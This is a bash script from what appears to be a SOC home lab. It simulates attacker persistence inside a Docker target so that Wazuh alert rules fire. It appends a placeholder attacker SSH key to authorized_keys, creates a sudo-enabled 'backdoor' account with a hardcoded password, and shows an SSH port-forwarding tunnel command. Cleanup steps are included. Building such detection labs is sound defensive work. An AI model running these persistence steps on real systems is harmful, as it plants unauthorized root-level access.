#!/bin/bash
# SOC Home Lab — Phase 3: Persistence & Lateral Movement
# Run INSIDE the ubuntu-target container (as root or with sudo).
#
# Method 1 — via docker exec:
#   docker exec -it ubuntu-target bash -c "$(cat attacks/phase3_persistence.sh)"
#
# Method 2 — via SSH (need password):
#   ssh labuser@127.0.0.1 -p 2222
#   Then: sudo bash -s < attacks/phase3_persistence.sh
#
# Triggers:
#   Rule 100202 — authorized_keys modified (FIM alert)
#   Rule 100205 — new user account created
#   Rule 100201 — SSH tunneling/port forwarding (initiated from Phase 1 session)

echo "============================================================"
echo "SOC Lab — Phase 3: Persistence & Lateral Movement"
echo "Running as: $(whoami) on $(hostname)"
echo "Expected alerts: 100202, 100205, 100201"
echo "============================================================"
echo

# ── Trigger 100202: Add SSH key to authorized_keys (FIM) ─────────
echo "[*] Trigger 1: SSH authorized_keys modification (rule 100202)"
echo "    Simulating: attacker adding their public key for persistent access"
mkdir -p /home/labuser/.ssh
# Generates a dummy attacker key fingerprint entry
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0ATTACKER_KEY_PLACEHOLDER attacker@c2server" \
    >> /home/labuser/.ssh/authorized_keys
chmod 600 /home/labuser/.ssh/authorized_keys
chown labuser:labuser /home/labuser/.ssh/authorized_keys
echo "[+] authorized_keys modified. Rule 100202 (FIM) should fire."
echo "    Wazuh FIM scans every 6 hours by default — for instant trigger,"
echo "    force a FIM scan: docker exec wazuh-manager /var/ossec/bin/agent_control -r -u <agent_id>"
echo

# ── Trigger 100205: Create backdoor user account ─────────────────
echo "[*] Trigger 2: New user account creation (rule 100205)"
echo "    Simulating: attacker creating a backdoor account 'backdoor'"
# Remove if already exists from a previous run
userdel -r backdoor 2>/dev/null || true
useradd -m -s /bin/bash -p $(echo "B@ckd00r!" | openssl passwd -1 -stdin) backdoor
usermod -aG sudo backdoor
echo "[+] User 'backdoor' created. Rule 100205 should fire."
echo

# ── Trigger 100201: SSH tunneling ────────────────────────────────
echo "[*] Trigger 3: SSH port forwarding (rule 100201)"
echo "    This triggers from the SSH session flags — run from your attacker host:"
echo
echo "    ssh -N -L 8080:wazuh.indexer:9200 labuser@127.0.0.1 -p 2222"
echo
echo "    The '-L' flag triggers the 'direct-tcpip' channel in sshd logs,"
echo "    which matches rule 100201."
echo

# ── Cleanup hint ──────────────────────────────────────────────────
echo "============================================================"
echo "Phase 3 complete."
echo
echo "To CLEAN UP after the lab run:"
echo "  userdel -r backdoor"
echo "  # Remove the attacker key from authorized_keys"
echo "  sed -i '/attacker@c2server/d' /home/labuser/.ssh/authorized_keys"
echo "============================================================"
